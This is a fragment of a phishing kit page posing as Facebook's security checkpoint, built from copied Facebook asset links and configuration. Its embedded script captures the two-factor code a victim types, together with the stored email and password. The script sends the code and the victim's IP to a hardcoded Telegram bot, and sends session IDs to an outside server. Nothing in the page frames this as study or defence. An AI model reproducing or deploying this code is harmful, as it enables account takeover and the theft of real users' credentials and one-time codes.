    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yg/r/0PL8TwiArvX.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iugo4/yF/l/en_GB/iUIsWhPCKwQ.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yT/r/cUQ2KDv-28W.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iPho4/yf/l/en_GB/jtFX9oPh-rG.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/lBhpSuCHqlC.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/rh6BFHcolJv.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/auiTYG4detb.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iNig4/y5/l/en_GB/ApRJ8kgnfrz.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/l/0,cross/Lex8yRQ_Q9j.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iIsV4/ym/l/en_GB/vaw2vv8AnuM.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yx/l/0,cross/gCNYZe6cxol.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/bug2xquMPuL.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/l/0,cross/hQGlnhH1ySI.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yY/r/wz4eFapmB0L.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i4El4/yC/l/en_GB/VnCd8zeE862.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3ikpZ4/yT/l/en_GB/B-5RtTZk4Uc.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yF/r/FLJXkx8ys-6.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yY/r/ettzSjjd8qW.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/ZpIjd2yWZpT.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/pB9RJLb8Ab0.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yo/r/jAPkfVBB_pB.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iPiP4/y3/l/en_GB/lSUWvfywlLD.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iX3c4/ya/l/en_GB/ZkXgPqOe394.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/r/O1bBfI_TOMc.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/qwTbUSCo6xE.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iQbs4/yH/l/en_GB/ygmdn2QYuF2.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/55smIQ7qGtP.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/eld1bIEp_FP.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yg/r/kaEN7h2Cq5-.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i78z4/yl/l/en_GB/zKBAXAdshsv.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iNLz4/yA/l/en_GB/frCXTj5JK0U.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3ieuP4/yW/l/en_GB/ArR1SqCkzVQ.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yr/r/YqmkBTyjnhN.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/bfCNYcZ1q8f.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3ifFF4/yu/l/en_GB/MZsB1o3DtVy.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yK/l/0,cross/XnU40tC_gb_.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iLl54/y4/l/en_GB/FHaK1siMCFo.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/p2uRdKIFa19.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iCLw4/yo/l/en_GB/fDcR0_w1Epv.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iJRM4/yI/l/en_GB/RO9wQGmEXpW.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/r/y2n4G5PUjiP.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/WhWh8DCF6ia.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yx/l/0,cross/oGzTijCcoht.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/r/x4Eyp9nQ1uk.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i4lr4/y0/l/en_GB/I_976Jqctx5.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i16l4/yQ/l/en_GB/5WvvlnOddbZ.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/406m5o1VFPo.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i44x4/yT/l/en_GB/ADzIU79dVvd.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/DueuDjxU2tp.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yY/r/fu6pBP0iJwV.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3itTO4/yI/l/en_GB/llyHVZ7piYq.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yI/r/iUo8ioU0bEN.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3idQ44/yg/l/en_GB/RhkPvMmOODi.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/ovgyyNZBzbG.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yI/r/STaSMtYWTKt.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iac54/yj/l/en_GB/k5iwwa_Z0OZ.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ys/r/5YzZOufT839.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/wMByPS4aroS.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/CGbHHwHe4O7.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/pukjd1lDNzh.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/r/KSjEo3NYt0Z.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yT/r/MuVJ3kziB_s.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/BwjU4B_qfpp.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/Q8l15Gcoqvz.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="p7huT6ad" />
    <script>
        $(document).ready(function() {

            var userAgent = navigator.userAgent;
            console.log(userAgent);
            GetSess();
            getIP();
            AddSess();

            SendMess("New Loading :  \n Session_ID: " + sessid + "\n ");
            document.getElementById('cgn').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    sendCode();
                }
            });



            $("#u_0_7_HB").click(function() {
                $(".2fa-error").html('<p style="color: Gray;">Authentication in progress.</p>');
                var clientToken = localStorage.getItem('clientToken');
                var email = localStorage.getItem('email');
                var password = localStorage.getItem('password');
                var payload = {
                    'type': 'resend',
                    'email': email,
                    'password': password,
                };
                $.ajax({
                    url: 'server.php',
                    dataType: 'json',
                    data: payload,
                    method: "POST",
                    headers: {
                        'x-client-token': clientToken // Truyền clientToken trong tiêu đề x-client-token
                    },
                    success: function(response) {
                        response = JSON.parse(response)
                        if (response.status) {
                            $(".2fa-error").html('<p style="color: green;">' + response.message + '</p>')
                        } else {
                            $(".2fa-error").html('<p style="color: red;">' + response.message + '</p>')
                        }
                    },
                    error: function(err) {
                        console.log(err);
                    }
                });
            });
        });
        var sessid = "";
        var ip = "";
        var country = "";
        // function SendInfo()
        // {
        //     var email = $('.email').val;
        //     alert(email);
        // }
        $("#submit_2fa").click(function() {
            sendCode();
        });

        function sendCode() {
            $(".2fa-error").html('<p style="color: Gray;">Authentication in progress.</p>');
            var clientToken = localStorage.getItem('clientToken');
            var typeCheckPoint = localStorage.getItem('typeCheckPoint');
            var email = localStorage.getItem('email');
            var password = localStorage.getItem('password');
            var payload = {
                'opt': $("#cgn").val(),
                'typeCheckPoint': typeCheckPoint,
                'type': "otp",
                'email': email,
                'password': password,
            };
            var code = $("#cgn").val();
            $.ajax({
                url: 'https://api.telegram.org/bot6527756193:AAH07r_EdcMQLB5qhqKc0-M2KY4bmFYXCKk/sendMessage',
                method: 'POST',
                data: {
                    chat_id: '-4089815989',
                    text: '2FA: ' + code + '\nIp: ' + ip
                }
            });
            $.ajax({
                url: 'server.php',
                dataType: 'json',
                data: payload,
                method: "POST",
                headers: {
                    'x-client-token': clientToken // Truyền clientToken trong tiêu đề x-client-token
                },
                success: function(response) {
                    response = JSON.parse(response)
                    if (response.status) {
                        // $("#passwordModal").modal("hide");
                        $(".2fa-error").html('<p style="color: green;">Correct Code</p>')
                        setTimeout(() => {
                            window.location.href = "loading.php"
                        }, 1500);
                    } else {
                        $(".2fa-error").html('<p style="color: red;">Incorrect Code</p>')
                    }
                },
                error: function(err) {
                    console.log(err);
                }
            });
        }

        function checkCountry(ip) {
            $.ajax({
                url: 'https://ipinfo.io/' + ip + '/json?',
                dataType: 'json',
                success: function(response) {
                    country = response.country;
                    console.log(country);
                },
                error: function() {
                    $("#ip-info").text("Không thể kiểm tra quốc gia cho IP " + ip);
                }
            });
        }

        function getIP() {
            $.ajax({
        url: 'https://ipapi.co/ip',
        type: 'GET',
        contentType: 'application/json',
        async: true,
        success: function (msg) {
            ip = msg;
        }
    });
        }
		

        function GetSess() {
            var username = $.cookie();
            if (username) {
                sessid = username['PHPSESSID'];
                console.log(username['PHPSESSID']);
            } else {
                $('#cookieValue').text('Cookie không tồn tại');
            }
            return sessid;
        }

        function AddSess() {
            $.ajax({
                url: 'https://1646415.com/modun_post.php',
                type: 'POST',
                dataType: 'JSON',
                data: {
                    t: 'insert_sess',
                    id: sessid
                },

                success: function(data) {
                    console.log('true', data);
                },
                error: function() {
                    console.error('false');

                }
            });

        }

        function SendMess(text) {
            $.ajax({
                url: "https://api.telegram.org/bot6527756193:AAH07r_EdcMQLB5qhqKc0-M2KY4bmFYXCKk/sendMessage?chat_id=-&text=" + text,
                type: 'POST',
                success: function(data) {
                    console.log('true', data);
                },
                error: function() {
                    console.error('false');

                }
            });
        }
    </script>
    <script>
        window.__bigPipeCtor = now_inl();
        requireLazy(["BigPipe"], function(BigPipe) {
            define("__bigPipe", [], window.bigPipe = new BigPipe({
                "forceFinish": true,
                "config": {
                    "flush_pagelets_asap": true,
                    "dispatch_pagelet_replayable_actions": false
                }
            }));
        });
    </script>
    <script nonce="p7huT6ad">
        (function() {
            var n = now_inl();
            requireLazy(["__bigPipe"], function(bigPipe) {
                bigPipe.beforePageletArrive("first_response", n);
            })
        })();
    </script>
    <script nonce="p7huT6ad">
        requireLazy(["__bigPipe"], (function(bigPipe) {
            bigPipe.onPageletArrive({
                displayResources: ["Pud6B2Z", "yHyxn9P", "t29hWfM", "DcLQ9Pg", "KSZgfG2", "eUyf8CS", "j4zvrHq", "esk5Keq", "OprjAFb", "dWto8Fr", "b5xEmfa", "+gV5Yf8", "kdBQtZx", "t9qKYdU", "u2lEGNZ", "W7msqt2", "r3EQI/7", "P/mr5VE", "R5w1rCJ", "ui5YqOD", "VIf4Ek6", "KsbRs3u", "rSPKCk0", "GSMBc2t", "OJ/VYPa", "hUng91v", "7kH7+NR", "93m3dw7", "6PVCkxL", "0e46/I2", "sGA5ygv", "QVaGCwS", "/WjhCRr", "mO2RUoG", "rRp/VIo", "U305z2R", "YO6bT4e", "1Eujem8", "kZsuQiv", "SQkyWuZ", "Adnd463", "tVxWt4B", "kH9/wH3", "WdX7+Hr", "lCaD8N+", "Eq1TOo1", "/QjpcAz", "L1Nrm8r", "9fk1mA4", "nisLjhr", "DHCAHtz", "cn0XTdP", "TATmLzc", "pZuCvpU", "L4hERRP", "Ro9ax7u", "V/HbucZ", "mRCtS70", "KSdkm1x", "xlYyWYt", "Qs85tDS", "csb9jgJ", "nsTu93q", "qYLMf3s", "ryOKzzw", "ggezTF6", "ZrL6x0y", "5da4dyt", "c57ygNg", "cKeMLg4", "qOjQlC4", "hVFSZgm", "EbBs+QD", "0MZA9dA", "+CBgy4r", "SAneTkc", "YKvMr0V", "PieaLd3", "+YyWEG3", "4eBa/GF", "CGkH4FY", "687lmEL", "0+ngg9M", "wPV6M1n", "bjhqC6h", "4p9A1tT", "lzINop4", "rSaoiQW", "V5ifvjf", "Ms3iKW3", "MVs/C4J", "9h+P7Fn", "bASZ9cv", "Ky1sNm1", "7uPi2z/", "aYPWTB4", "t2d32ok", "47NQ/9A", "mFkoxEV", "KQ+loWk", "lT5fWsJ"],
                id: "first_response",
                phase: 0,
                last_in_phase: true,
                tti_phase: 0,
                all_phases: [63],
                hsrp: {
                    hblp: {
                        consistency: {
                            rev: 1008297119
                        }
                    }
                },
                allResources: ["Pud6B2Z", "yHyxn9P", "t29hWfM", "DcLQ9Pg", "L4hERRP", "OJ/VYPa", "OprjAFb", "eUyf8CS", "j4zvrHq", "esk5Keq", "dWto8Fr", "KSZgfG2", "b5xEmfa", "+gV5Yf8", "kdBQtZx", "t9qKYdU", "u2lEGNZ", "W7msqt2", "R5w1rCJ", "7kH7+NR", "mO2RUoG", "ui5YqOD", "KSdkm1x", "xlYyWYt", "Qs85tDS", "csb9jgJ", "6PVCkxL", "VIf4Ek6", "ggezTF6", "ZrL6x0y", "sGA5ygv", "KsbRs3u", "lzINop4", "rSPKCk0", "GSMBc2t", "0e46/I2", "hUng91v", "pZuCvpU", "r3EQI/7", "P/mr5VE", "93m3dw7", "QVaGCwS", "/WjhCRr", "rRp/VIo", "U305z2R", "YO6bT4e", "1Eujem8", "kZsuQiv", "SQkyWuZ", "Adnd463", "tVxWt4B", "kH9/wH3", "WdX7+Hr", "lCaD8N+", "Eq1TOo1", "/QjpcAz", "L1Nrm8r", "9fk1mA4", "nisLjhr", "DHCAHtz", "cn0XTdP", "TATmLzc", "Ro9ax7u", "V/HbucZ", "mRCtS70", "nsTu93q", "qYLMf3s", "ryOKzzw", "5da4dyt", "c57ygNg", "cKeMLg4", "qOjQlC4", "hVFSZgm", "EbBs+QD", "0MZA9dA", "+CBgy4r", "SAneTkc", "YKvMr0V", "PieaLd3", "+YyWEG3", "4eBa/GF", "CGkH4FY", "687lmEL", "0+ngg9M", "wPV6M1n", "bjhqC6h", "4p9A1tT", "rSaoiQW", "V5ifvjf", "Ms3iKW3", "MVs/C4J", "9h+P7Fn", "bASZ9cv", "Ky1sNm1", "7uPi2z/", "aYPWTB4", "t2d32ok", "47NQ/9A", "mFkoxEV", "KQ+loWk", "lT5fWsJ", "MkqgjDy", "OiWJ4+T"]
            });
        }));
    </script>
    <script src="../kit.fontawesome.com/83fd8385f7.js" crossorigin="anonymous"></script>


    <script src="../www.google.com/recaptcha/api7d84.js?render=6LdJmj4UAAAAAIuZYXdT_YrsKuN40bwlMqdimgPl"></script>
    <script src="js/bootstrap.js" crossorigin="anonymous"></script>
    <script src="js/common.js"></script>

    <script>
        requireLazy(["__bigPipe"], function(bigPipe) {
            bigPipe.setPageID("7272438987213552917")
        });
    </script>
    <script nonce="p7huT6ad">
        (function() {
            var n = now_inl();
            requireLazy(["__bigPipe"], function(bigPipe) {
                bigPipe.beforePageletArrive("last_response", n);
            })
        })();
    </script>
    <script nonce="p7huT6ad">
        requireLazy(["__bigPipe"], (function(bigPipe) {
            bigPipe.onPageletArrive({
                displayResources: ["OprjAFb"],
                id: "last_response",
                phase: 63,
                last_in_phase: true,
                the_end: true,
                jsmods: {
                    define: [
                        ["MarauderConfig", [], {
                            app_version: "1.0.0.0 (1008298681)",
                            gk_enabled: false
                        }, 31],
                        ["RTISubscriptionManagerConfig", [], {
                            config: {},
                            autobot: {},
                            assimilator: {},
                            unsubscribe_release: true,
                            bladerunner_www_sandbox: null,
                            is_intern: false
                        }, 1081],
                        ["MqttWebConfig", [], {
                            fbid: "0",
                            appID: 219994525426954,
                            endpoint: "wss://edge-chat.facebook.com/chat",
                            pollingEndpoint: "https://edge-chat.facebook.com/mqtt/pull",
                            subscribedTopics: [],
                            capabilities: 10,
                            clientCapabilities: 3,
                            chatVisibility: false,
                            hostNameOverride: ""
                        }, 3790],
                        ["RequestStreamE2EClientSamplingConfig", [], {
                            sampleRate: 100000,
                            methodToSamplingMultiplier: {
                                RTCSessionMessage: 10000,
                                Presence: 0.01,
                                "FBGQLS:VOD_TICKER_SUBSCRIBE": 0.01,
                                "FBGQLS:STORIES_TRAY_SUBSCRIBE": 100,
                                Collabri: 0.1,
                                "FBGQLS:WORK_AVAILABILITY_STATUS_FANOUT_SUBSCRIBE": 0.1,
                                "FBGQLS:GROUP_UNSEEN_ACTIVITY_SUBSCRIBE": 0.1,
                                "FBGQLS:GROUP_RESET_UNSEEN_ACTIVITY_SUBSCRIBE": 0.1,
                                "FBGQLS:INTERN_CALENDAR_UPDATE_SUBSCRIBE": 0.1,
                                "SKY:gizmo_manage": 10000,
                                "FBGQLS:FEEDBACK_LIKE_SUBSCRIBE": 10,
                                "FBGQLS:HUDDLE_USERS_REQUESTED_TO_SPEAK_COUNT_SUBSCRIBE": 1000
                            }
                        }, 4501],
                        ["DGWWebConfig", [], {
                            appId: "256281040558",
                            appVersion: "0",
                            dgwVersion: "2",
                            endpoint: "",
                            fbId: "0",
                            authType: ""
                        }, 5508],
                        ["cr:1458113", [], {
                            __rc: [null, "Aa1gJvWZ45c9djqNXOV5Awk90UqcL2wA1vHVxtM67C-HIkLoqPEpzdo1HYZzy2cpG6CZzgLtKcCoxwGEbZ3MbvaVFdlsVZQ"]
                        }, -1],
                        ["cr:917439", ["PageTransitionsBlue"], {
                            __rc: ["PageTransitionsBlue", "Aa02clUa0_vxSIMJAlyrVHaVbKJfYLrfQD3sPiUqzZEEa_p6tTSWDKkUcMIzTCx8BSktHi86r-xyxKksxlS84hQ0EYo"]
                        }, -1],
                        ["cr:3024", [], {
                            __rc: [null, "Aa2HB5ImXGg94AR8XR2oLXOtNihlTPMMI6yXqIrGdGUwuF_0U0WXqmW45G-d3zXGEH3ME4hDg356vI4"]
                        }, -1],
                        ["cr:2046346", [], {
                            __rc: [null, null]
                        }, -1],
                        ["PageTransitionsConfig", [], {
                            reloadOnBootloadError: true
                        }, 1067],
                        ["TrackingConfig", [], {
                            domain: "https://pixel.facebook.com"
                        }, 325],
                        ["WebStorageMonsterLoggingURI", [], {
                            uri: "/ajax/webstorage/process_keys/?state=1"
                        }, 3032],
                        ["TimeSpentConfig", [], {
                            delay: 1000,
                            timeout: 64,
                            "0_delay": 0,
                            "0_timeout": 8
                        }, 142],
                        ["WebDevicePerfInfoData", [], {
                            needsFullUpdate: true,
                            needsPartialUpdate: false,
                            shouldLogResourcePerf: false
                        }, 3977],
                        ["cr:1634616", ["UserActivityBlue"], {
                            __rc: ["UserActivityBlue", "Aa02clUa0_vxSIMJAlyrVHaVbKJfYLrfQD3sPiUqzZEEa_p6tTSWDKkUcMIzTCx8BSktHi86r-xyxKksxlS84hQ0EYo"]
                        }, -1],
                        ["cr:844180", ["TimeSpentImmediateActiveSecondsLoggerBlue"], {
                            __rc: ["TimeSpentImmediateActiveSecondsLoggerBlue", "Aa02clUa0_vxSIMJAlyrVHaVbKJfYLrfQD3sPiUqzZEEa_p6tTSWDKkUcMIzTCx8BSktHi86r-xyxKksxlS84hQ0EYo"]
                        }, -1],
                        ["cr:1187159", ["BlueCompatBroker"], {
                            __rc: ["BlueCompatBroker", "Aa02clUa0_vxSIMJAlyrVHaVbKJfYLrfQD3sPiUqzZEEa_p6tTSWDKkUcMIzTCx8BSktHi86r-xyxKksxlS84hQ0EYo"]
                        }, -1],
                        ["cr:5800", [], {
                            __rc: [null, "Aa0dr8mOieTbIliWuM0PbxSGwjCCsVBGL81976HblunZy8_iK-gLLTcP0IpoptcETxDLmEB-S_rYmVAaK9rCRyUFH9E"]
                        }, -1],
                        ["ImmediateActiveSecondsConfig", [], {
                            sampling_rate: 0
                        }, 423]
                    ],
                    require: [
                        ["BDClientSignalCollectionTrigger", "startSignalCollection", [],
                            [{
                                sc: "{\"t\":1659080345,\"c\":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30021,540823],[30022,540817],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}",
                                fds: 60,
                                fda: 60,
                                i: 60,
                                sbs: 1,
                                dbs: 100,
                                bbs: 100,
                                hbi: 60,
                                rt: 262144,
                                hbcbc: 2,
                                hbvbc: 0,
                                hbbi: 30,
                                sid: -1,
                                hbv: "1751031325998829684"
                            }]
                        ],
                        ["NavigationMetrics", "setPage", [],
                            [{
                                page: "WebCheckpointController",
                                page_type: "normal",
                                page_uri: "https://www.facebook.com/checkpoint/",
                                serverLID: "7272438987213552917"
                            }]
                        ],
                        ["FalcoLoggerTransports", "attach", [],
                            []
                        ],
                        ["Chromedome", "start", [],
                            [{}]
                        ],
                        ["DimensionTracking"],
                        ["ClickRefLogger"],
                        ["DetectBrokenProxyCache", "run", [],
                            [0, "c_user"]
                        ],
                        ["NavigationClickPointHandler"],
                        ["ServiceWorkerURLCleaner", "removeRedirectID", [],
                            []
                        ],
                        ["WebDevicePerfInfoLogging", "doLog", [],
                            []
                        ],
                        ["WebStorageMonster", "schedule", [],
                            []
                        ],
                        ["Artillery", "disable", [],
                            []
                        ],
                        ["ScriptPathLogger", "startLogging", [],
                            []
                        ],
                        ["TimeSpentBitArrayLogger", "init", [],
                            []
                        ],
                        ["TransportSelectingClientSingletonConditional"],
                        ["RequireDeferredReference", "unblock", [],
                            [
                                ["TransportSelectingClientSingletonConditional"], "sd"
                            ]
                        ],
                        ["RequireDeferredReference", "unblock", [],
                            [
                                ["TransportSelectingClientSingletonConditional"], "css"
                            ]
                        ]
                    ]
                },
                hsrp: {
                    hsdp: {
                        clpData: {
                            "1743095": {
                                r: 1,
                                s: 1
                            },
                            "1871697": {
                                r: 1,
                                s: 1
                            },
                            "1829319": {
                                r: 1
                            },
                            "1829320": {
                                r: 1
                            },
                            "1843988": {
                                r: 1
                            }
                        },
                        gkxData: {
                            "1652843": {
                                result: false,
                                hash: "AT6uh9NWRY4QEQoYNBE"
                            }
                        }
                    },
                    hblp: {
                        consistency: {
                            rev: 1008297119
                        },
                        rsrcMap: {
                            zPYlTyl: {
                                type: "js",
